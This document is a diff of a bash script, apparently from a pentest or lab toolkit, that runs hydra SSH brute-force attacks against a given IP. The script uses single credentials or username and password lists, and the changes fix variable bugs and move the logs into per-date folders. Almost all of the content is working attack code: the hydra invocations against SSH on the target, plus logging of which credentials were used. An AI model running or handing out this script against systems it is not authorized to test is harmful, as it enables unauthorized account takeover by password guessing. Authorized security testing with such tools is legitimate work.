@@ -72,68 +72,71 @@ if ! [[ -e $LOG_PATH ]]; then
 fi
 
 # Create directory and set path to save results
-mkdir -p ../logs/$IP/attacks
-SAVE_PATH="../logs/$IP/attacks/brute_force_SSH.txt"
+mkdir -p ../logs/$TODAY/$IP/attacks
+SAVE_PATH="../logs/$TODAY/$IP/attacks/brute_force_SSH.txt"
 
 # Run hydra based on user input
-if [[ -z $user_list && -z password_list ]]; then
+if [[ -z $user_list && -z $password_list ]]; then
 	# Log brute force SSH attack
 	echo "$DATETIME" >> $LOG_PATH
 	echo "SSH brute force attack conducted on $IP" >> $LOG_PATH
 	echo "Credentials used:" >> $LOG_PATH
 	echo "username: $user" >> $LOG_PATH
 	echo "password: $password" >> $LOG_PATH
-	echo "Details saved in logs/$IP/attacks/brute_force_SSH.txt" >> $LOG_PATH
+	echo "Details saved in logs/$TODAY/$IP/attacks/brute_force_SSH.txt" >> $LOG_PATH
+	echo "" >> $LOG_PATH
 
 	# Run hydra attack
 	hydra -l $user -p $password -s $port -o $SAVE_PATH -vV $IP ssh
-	echo "" >> $LOG_PATH
-elif [[ $user_list && -z password_list ]]; then
+	
+elif [[ $user_list && -z $password_list ]]; then
 	# Parse user_list to only get txt file and not full path
-	user_list=$(echo $user_list | awk -F/ '{print $NF}')
+	user_list_parsed=$(echo $user_list | awk -F/ '{print $NF}')
 
 	# Log brute force SSH attack
 	echo "$DATETIME" >> $LOG_PATH
 	echo "SSH brute force attack conducted on $IP" >> $LOG_PATH
 	echo "Credentials used:" >> $LOG_PATH
-	echo "username list: $user_list" >> $LOG_PATH
+	echo "username list: $user_list_parsed" >> $LOG_PATH
 	echo "password: $password" >> $LOG_PATH
-	echo "Details saved in logs/$IP/attacks/brute_force_SSH.txt" >> $LOG_PATH
+	echo "Details saved in logs/$TODAY/$IP/attacks/brute_force_SSH.txt" >> $LOG_PATH
 	echo "" >> $LOG_PATH
 
 	# Run hydra attack
 	hydra -L $user_list -p $password -s $port -o $SAVE_PATH -vV $IP ssh
-elif [[ -z $user_list && password_list ]]; then
+
+elif [[ -z $user_list && $password_list ]]; then
 	# Parse password_list to only get txt file and not full path
-	password_list=$(echo $password_list | awk -F/ '{print $NF}')
+	password_list_parsed=$(echo $password_list | awk -F/ '{print $NF}')
 
 	# Log brute force SSH attack
 	echo "$DATETIME" >> $LOG_PATH
 	echo "SSH brute force attack conducted on $IP" >> $LOG_PATH
 	echo "Credentials used:" >> $LOG_PATH
 	echo "username: $user" >> $LOG_PATH
-	echo "password list: $password_list" >> $LOG_PATH
-	echo "Details saved in logs/$IP/attacks/brute_force_SSH.txt" >> $LOG_PATH
+	echo "password list: $password_list_parsed" >> $LOG_PATH
+	echo "Details saved in logs/$TODAY/$IP/attacks/brute_force_SSH.txt" >> $LOG_PATH
 	echo "" >> $LOG_PATH
-	
+
 	# Run hydra attack
 	hydra -l $user -P $password_list -s $port -o $SAVE_PATH -vV $IP ssh
-elif [[ $user_list && password_list ]]; then
+
+elif [[ $user_list && $password_list ]]; then
 	# Parse user_list and password_list to only get txt file and not full path
-	user_list=$(echo $user_list | awk -F/ '{print $NF}')
-	password_list=$(echo $password_list | awk -F/ '{print $NF}')
+	user_list_parsed=$(echo $user_list | awk -F/ '{print $NF}')
+	password_list_parsed=$(echo $password_list | awk -F/ '{print $NF}')
 
 	# Log brute force SSH attack
 	echo "$DATETIME" >> $LOG_PATH
 	echo "SSH brute force attack conducted on $IP" >> $LOG_PATH
 	echo "Credentials used:" >> $LOG_PATH
-	echo "username list: $user_list" >> $LOG_PATH
-	echo "password list: $password_list" >> $LOG_PATH
-	echo "Details saved in logs/$IP/attacks/brute_force_SSH.txt" >> $LOG_PATH
+	echo "username list: $user_list_parsed" >> $LOG_PATH
+	echo "password list: $password_list_parsed" >> $LOG_PATH
+	echo "Details saved in logs/$TODAY/$IP/attacks/brute_force_SSH.txt" >> $LOG_PATH
 	echo "" >> $LOG_PATH
 
 	# Run hydra attack
 	hydra -L $user_list -P $password_list -s $port -o $SAVE_PATH -vV $IP ssh
 fi
 
-echo "[*] Results have been saved in logs/$IP/attacks/brute_force_SSH.txt"
+echo "[*] Results have been saved in logs/$TODAY/$IP/attacks/brute_force_SSH.txt"
